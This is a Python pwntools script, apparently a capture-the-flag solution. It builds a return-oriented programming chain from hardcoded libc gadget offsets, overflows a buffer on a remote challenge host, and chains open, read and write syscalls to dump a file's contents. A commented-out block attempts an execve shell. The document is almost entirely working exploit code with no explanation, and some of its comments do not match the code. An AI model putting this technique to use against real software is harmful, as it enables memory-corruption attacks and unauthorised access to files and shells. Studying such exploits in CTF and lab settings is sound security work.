from pwn import *

# conn = process('./chall')
conn = remote('host.cg21.metaproblems.com', 3030)

from struct import pack

p = lambda x : pack('Q', x)

'''
Goal 1: Find libc address
0x00000000004013f2: pop rbx; pop rbp; mov r12, qword ptr [rsp]; add rsp, 8; ret;
0x00000000004013c0: mov rsi, rbx; (plus a lot of other things)
GOT write(): 0x404028
'''




IMAGE_BASE_0 = 0x7ffff72ec000  # cec05a3628872b27c16a2000b4d6985447a0d6426c19038132333ea5c5615d4a

'''
Goal 2: Read the flag file
rax=59
rdi=/bin/sh
rsi=0
rdx=0

set r8-r10:
0x000000000009c8ba: mov r8, qword ptr [rax + 8]; ret;
0x0000000000064132: mov r9, qword ptr [rdx + 0x30]; mov rdx, qword ptr [rdx + 0x88]; xor eax, eax; ret;
0x0000000000052ff6: add r10, qword ptr [rdi + 0x20]; mov rax, r10; ret;

set rax:
0x00000000000b90e6: mov rax, r9; ret;

set rdi:
0x00000000000a5634: mov rdi, qword ptr [rax + 8]; ret;

set rsi:
0x000000000009c531: mov rsi, qword ptr [rax + 8]; ret;

set rdx:
0x000000000008ef1b: pop rdx; ret;

syscall:
0x000000000009cfc2: syscall; ret;

save rax:
0x00000000006739a8: push rax; add rsp, 0x28; ret;
0x0000000000099952: mov qword ptr [rcx + 8], rax; pop rcx; ret;
'''

rebase_0 = lambda x : p(x + IMAGE_BASE_0)

# data_loc = 0x0000000000cc81c0
data_loc = 0x7fffffffd000 - IMAGE_BASE_0

rop = b''

def set_rcx(what):
    global rop
    rop += rebase_0(0x000000000005d510) # 0x000000000005d510: pop rcx; ret;
    rop += what

def set_rdx(what):
    global rop
    rop += rebase_0(0x000000000008ef1b) # 0x000000000008ef1b: pop rdx; ret;
    rop += what

def write_byte(what):
    global rop, data_loc
    rop += rebase_0(0x000000000005d510) # 0x000000000005d510: pop rcx; ret; 
    rop += what
    rop += rebase_0(0x000000000008ef1b) # 0x000000000008ef1b: pop rdx; ret; 
    rop += rebase_0(data_loc)
    rop += rebase_0(0x00000000000b9021) # 0x00000000000b9021: mov qword ptr [rdx], rcx; ret; 
    # rop += rebase_0(0x000000000005d510) # 0x000000000005d510: pop rcx; ret;
    data_loc += 8
    return data_loc - 8

# Deletes rdx and rax
def read_r9(where):
    global rop
    set_rdx(rebase_0(where - 0x30))
    rop += rebase_0(0x0000000000064132) # 0x0000000000064132: mov r9, qword ptr [rdx + 0x30]; mov rdx, qword ptr [rdx + 0x88]; xor eax, eax; ret;

# Deletes rax
def read_r8(where):
    global rop
    set_rax(rebase_0(where - 8))
    rop += rebase_0(0x000000000009c8ba) # 0x000000000009c8ba: mov r8, qword ptr [rax + 8]; ret;

# Deletes rdi and rax
def zero_r10():
    global rop
    offset_loc = write_byte(p(0xffff800008d0da78))
    offset_ptr_loc = write_byte(rebase_0(offset_loc - 0x20))
    read_rdi(offset_ptr_loc)
    rop += rebase_0(0x0000000000052ff6) # 0x0000000000052ff6: add r10, qword ptr [rdi + 0x20]; mov rax, r10; ret;

# Deletes rdx
def set_rax(what):
    global rop
    loc = write_byte(what)
    read_r9(loc)
    rop += rebase_0(0x00000000000b90e6) # 0x00000000000b90e6: mov rax, r9; ret;

def read_rdi(where):
    global rop
    set_rax(rebase_0(where - 8))
    rop += rebase_0(0x00000000000a5634) # 0x00000000000a5634: mov rdi, qword ptr [rax + 8]; ret;

def read_rsi(where):
    global rop
    set_rax(rebase_0(where - 8))
    rop += rebase_0(0x000000000009c531) # 0x000000000009c531: mov rsi, qword ptr [rax + 8]; ret;

def syscall():
    global rop
    rop += rebase_0(0x000000000009cfc2) # 0x000000000009cfc2: syscall; ret;


# Do the ROP
# rax: rdi, rsi, rdx

DEBUG = True

if DEBUG:
    # Exit with code 0
    zero_loc = write_byte(p(0))
    read_rdi(zero_loc)
    set_rax(p(60))
    syscall()
else:
    # Part 1: open('flag.txt', 0, 0) -> 2: ptr to flag.txt, 0, 0
    file_loc = write_byte(b'./chall\0')
    zero_loc = write_byte(p(0))
    file_loc_ptr = write_byte(rebase_0(file_loc))

    read_rdi(file_loc_ptr)
    read_rsi(zero_loc)
    set_rax(p(2))
    set_rdx(p(0))
    syscall()

    # Transition
    open_file_ptr = data_loc
    data_loc += 8
    set_rcx(rebase_0(open_file_ptr - 8))
    rop += rebase_0(0x0000000000099952) # 0x0000000000099952: mov qword ptr [rcx + 8], rax; pop rcx; ret;
    rop += p(0)

    # Part 2: read(file, buf, 32) -> 0: file, buf, 32
    contents_ptr = write_byte(rebase_0(data_loc + 0x100))
    read_rdi(open_file_ptr)
    read_rsi(contents_ptr)
    set_rax(p(0))
    set_rdx(p(320))
    syscall()

    # Part 3: write(stdout, buf, 32) -> 1: 1, buf, 32
    one_loc = write_byte(p(1))
    read_rdi(one_loc)
    read_rsi(contents_ptr)
    set_rax(p(1))
    set_rdx(p(320))
    syscall()

    # Part 4: exit(0) -> 60: 0
    read_rdi(zero_loc)
    set_rax(p(60))
    syscall()

'''
binsh_loc = write_byte(b'.\0\0\0\0\0\0\0')
binsh_ptr_loc = write_byte(rebase_0(binsh_loc))
argv_array0 = write_byte(rebase_0(binsh_loc))
argv_array1 = write_byte(p(0))
argv_array_ptr_loc = write_byte(rebase_0(argv_array0))

read_rdi(binsh_ptr_loc)
read_rsi(zero_loc)
# read_rsi(argv_array_ptr_loc)
set_rax(p(59))
set_rdx(p(0))

syscall()
'''

# Run the exploit

exp = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ' + rop
exp = bytes(str(len(exp)), 'utf-8') + b'\n' + exp
with open('exp', 'wb') as fout:
    fout.write(exp)
conn.sendline(exp)
conn.interactive()
